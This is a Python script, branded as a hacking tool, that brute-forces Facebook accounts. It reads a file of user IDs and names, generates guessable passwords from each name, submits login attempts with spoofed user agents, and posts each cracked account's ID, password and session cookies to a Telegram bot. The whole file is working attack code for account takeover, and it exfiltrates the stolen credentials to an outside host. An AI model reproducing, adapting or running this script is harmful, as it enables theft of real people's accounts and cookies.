import random
import requests
import time
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup
from rich.console import Console
from rich.live import Live
import os
B = '\x1b[38;5;208m'
F = '\033[2;32m'
Z = '\033[1;31m'
C = '\033[2;35m'
M = '\x1b[1;37m'
X = '\033[1;33m'
A = '\033[2;34m'
kill = 0
ok = 0
no = 0
print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] YouTube    : {B}| NAI
|{Z}[+] TeleGram  : {B} DARKCYBER420    |
|{Z}[+] Instagram  : {B}MRSH4MUL420 |
|{Z}[+] Tool  : {B} FACEBOOK File |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')
token = input(B + f'Token BOT: {X}')
print('-' * 60)
ID = input(B + f'ID TELEGRAM : {C}')
file = input(f'[+] File Of Combo ID - ملف كومبو ايديات   ')
os.system('clear')
proxies = []
user_agents = []

for _ in range(1000):
    ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    port = random.choice([19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900])
    proxy = f"{ip}:{port}"
    proxies.append(proxy)

rox = random.choice(proxies)

for _ in range(1000):
    user_agent = f"Mozilla/5.0 (Linux; Android {random.randint(9, 10)}; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(0, 200)}.0.{random.randint(500, 4000)}.{random.randint(0, 200)} Mobile SFB/{random.randint(0, 150)}.0.{random.randint(0, 5000)}.{random.randint(0, 200)} Mobile Safari/537.36"
    user_agents.append(user_agent)

ua = random.choice(user_agents)


def mahos():
    pool = tred(max_workers=30)
    try:
        with open(file, "r") as f:
            for line in f:
                nmf = line.split('|')[1].lower()
                idf = line.split('|')[0]
                frs = nmf.split(' ')[0]
                pwv = []
                pwv.append(nmf)
                pwv.append(frs+frs)
                pwv.append("١٢٣٤٥٦")
                pwv.append(frs+"12")
                pwv.append(frs+"123")
                pwv.append(frs+'1234')      
                pwv.append(frs+'12345')     
                pwv.append('19991999')
                pwv.append('19981998')
                pwv.append('19971997')
                pwv.append('00998877')
                pwv.append(frs+'123456')
                pwv.append('0099887766')
                pwv.append(frs+"123123")
                pwv.append('11223344@@')
                pwv.append('12345@@@@@')
                pwv.append('123'+frs+'123')
                pwv.append('1234'+frs+'1234')
                pwv.append('12345'+frs+'12345')
                pwv.append('1q2q3q4q')
                pwv.append('1q2w3e4r')
                pwv.append('12344321')
                pwv.append('00998877')
                pwv.append('99887766')
                pwv.append('zxcvbnmmnbvcxz')
                pwv.append('qwertyuioppoiuytrewq')
                pwv.append('20002000@@')
                pwv.append('20232023@@')
                pwv.append('20242024@@')
                pwv.append('20232024')
                pwv.append('20232024@@')
                pwv.append('20012001@')
                pwv.append('19991999@@')
                pwv.append('19991999@')
                pwv.append('19901990')
                pwv.append('19901990@')
                pwv.append('19901990@@')
                pwv.append('12341234@@')
                pwv.append('zokoloko')
                pwv.append('aliali@@')
                pwv.append('حسين علي')
                pwv.append('mustafa2000')
                pwv.append('11112222@@')
                pwv.append('11112222@')
                pwv.append('11002299')
                pwv.append('11110000@')
                for psw in pwv:
                    ch(idf, psw)
    except FileNotFoundError:
        print("File not found")
                    
                    
def ch(idf, psw):
    global no, ok, kill
    ses = requests.Session()
    try:
        with requests.Session() as session1:
            rr = session1.get("https://mbasic.facebook.com/login")
            soup = BeautifulSoup(rr.content, 'html.parser')
            uid = soup.find('input', {'name': 'lsd'}).get('value')
            giz = soup.find('input', {'name': 'jazoest'}).get('value')
            tok = soup.find('input', {'name': 'li'}).get('value')
            mmmkk = session1.cookies.get_dict()
            hh = str(mmmkk.get('datr', ''))
            su = str(mmmkk.get('sb', ''))
            req = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/', params={'refsrc': 'deprecated', 'lwv': '100', 'ref': 'dbl'}, cookies={'datr': hh, 'sb': su, 'ps_l': '0', 'ps_n': '0'}, headers={'authority': 'mbasic.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '2', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"', 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': str(ua), 'viewport-width': '980'}, data={'lsd': str(uid), 'jazoest': str(giz), 'm_ts': str(time.time()).split('.')[0], 'li': str(tok), 'try_number': '0', 'unrecognized_tries': '0', 'email': str(idf), 'pass': str(psw), 'login': 'تسجيل الدخول', 'bi_xrwh': '0'}, proxies={'http': str(rox)})
            console = Console()
            with Live(console=console) as live:
                tt = f"\r[green]Good:[/green] {ok} [red]BAD:[/red] {no} [yellow]CP:[/yellow] {kill} [blue]ID:[/blue] {idf} [white]|Password:[/white] {psw}"
                live.update(tt)
                if "checkpoint" in ses.cookies.get_dict().keys():
                    kill += 1
                    try:
                        cook = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                    except:
                        cook = 'No Cookies'
                    tlg = (f'''
            حساب سيكور
-------------+------------+----------------    
ID = {idf}
-------------+------------+----------------    
Password = {psw}
-------------+------------+----------------    
Cookies = {cook}
-------------+------------+---------------- 
BY : @maho_9s | @maho9s
                ''')
                    print(B + tlg)
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))
                    
                elif "c_user" in ses.cookies.get_dict():
                    ok += 1
                    try:
                        cook = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                    except:
                        cook = 'No Cookies'
                    tlg = (f'''
 Good Login
 -------------+------------+----------------    
 ID = {idf}
 -------------+------------+----------------    
 Password = {psw}
 -------------+------------+----------------    
 Cookies = {cook}
 -------------+------------+----------------    
 BY : @maho_s9 | @maho9s
            ''')
                    print(F+tlg)
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlg))                    
                else:
                    no += 1                        
    except:
        no += 1
        print('Internet Not Higher:')     
        pass

mahos()
                          
